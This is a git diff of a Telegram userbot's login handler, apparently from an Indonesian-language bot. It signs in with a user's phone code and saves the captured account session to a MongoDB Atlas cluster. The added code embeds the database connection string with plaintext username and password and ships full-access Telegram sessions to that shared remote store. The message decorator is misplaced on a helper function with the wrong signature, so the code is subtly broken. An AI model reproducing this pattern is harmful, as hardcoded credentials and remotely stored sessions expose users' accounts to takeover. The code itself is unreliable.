@@ -13,10 +13,11 @@
 
 # You should have received a copy of the GNU Affero General Public License
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
 from Ubot.core.db import cli
 collection = cli["access"]
 
-import pymongo
+
 from pyrogram import (
     Client,
     filters
@@ -25,46 +26,35 @@ from pyrogram.types import (
     Message
 )
 from pyrogram.errors import (
-    PasswordHashInvalid
+    SessionPasswordNeeded,
+    BadRequest
 )
+from pymongo import MongoClient
 from Ubot import (
+    ACC_PROK_WITH_TFA,
     AKTIFPERINTAH,
-    TFA_CODE_IN_VALID_ERR_TEXT,
-    app,
-    bots
+    PHONE_CODE_IN_VALID_ERR_TEXT,
+    RECVD_PHONE_CODE,
+    SESSION_GENERATED_USING
 )
-import pymongo
-import sys
-import os
 import dotenv
 from dotenv import load_dotenv
+import os
+import pymongo
 from Ubot.logging import LOGGER
 from os import environ, execle
-from Ubot.modules.basic import restart
-from config import CHANNEL
 from Ubot.core.db import *
-import itertools
 import asyncio
-
+import sys
 HAPP = None
 
-from ubotlibs.ubot.database.accesdb import *
-
-load_dotenv()
-existing_sessions = [key for key in os.environ if key.startswith("SESSION")]
-session_counter = itertools.count(len(existing_sessions) + 1)
-
-MSG = """
-**Users**: `{}`
-**ID**: `{}`
-**Masa Aktif** : `{}`
-"""
 
 @Client.on_message(
     filters.text &
     filters.private,
-    group=3
+    group=2
 )
+
 async def delete_user_access(user_id: int) -> bool:
     try:
         result = user_id
@@ -74,26 +64,41 @@ async def delete_user_access(user_id: int) -> bool:
             return False
     except pymongo.errors.PyMongoError:
         return False
-    
-async def recv_tg_tfa_message(_, message: Message):
-    
+
+async def recv_tg_code_message(_, message: Message):
+
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
+    user_id = message.chat.id
     if not w_s_dict:
         return
+    sent_code = w_s_dict.get("SENT_CODE_R")
     phone_number = w_s_dict.get("PHONE_NUMBER")
     loical_ci = w_s_dict.get("USER_CLIENT")
-    is_tfa_reqd = bool(w_s_dict.get("IS_NEEDED_TFA"))
-    if not is_tfa_reqd or not phone_number:
+    if not sent_code or not phone_number:
         return
-    tfa_code = message.text
+    status_message = w_s_dict.get("MESSAGE")
+    if not status_message:
+        return
+    # await status_message.delete()
+    del w_s_dict["MESSAGE"]
+    phone_code = "".join(message.text.split(" "))
     try:
-        await loical_ci.check_password(tfa_code)
-    except PasswordHashInvalid:
-        await message.reply_text(
-            "Kode yang anda masukkan salah, coba masukan kembali atau mulai dari awal",
+        w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
+            phone_number,
+            sent_code.phone_code_hash,
+            phone_code
+        )
+    except BadRequest as e:
+        await status_message.reply_text(
+          f"{e} \n\nKode yang anda masukkan salah, coba masukan kembali atau mulai dari awal"
         )
         del AKTIFPERINTAH[message.chat.id]
-    else:
+    except SessionPasswordNeeded:
+        await status_message.reply_text(
+          "Verifikasi 2 Langkah Diaktifkan, Mohon Masukkan Verifikasi 2 Langkah Anda."
+        )
+        w_s_dict["IS_NEEDED_TFA"] = True
+    else:        
         client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -120,17 +125,20 @@ async def recv_tg_tfa_message(_, message: Message):
         }        
         mongo_collection.insert_one(session_data)
         await asyncio.sleep(2.0)
-        await delete_user_access(collection.users.delete_one({'user_id': message.chat.id}))
+        await delete_user_access(collection.users.delete_one({'user_id': int(message.chat.id)}))
         try:
             await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
+
             LOGGER(__name__).info("BOT SERVER RESTARTED !!")
         except BaseException as err:
             LOGGER(__name__).info(f"{err}")
             return
-        
+
         if HAPP is not None:
             HAPP.restart()
         else:
             args = [sys.executable, "-m", "Ubot"]
             execle(sys.executable, *args, environ)
+            
+    AKTIFPERINTAH[message.chat.id] = w_s_dict
     raise message.stop_propagation()
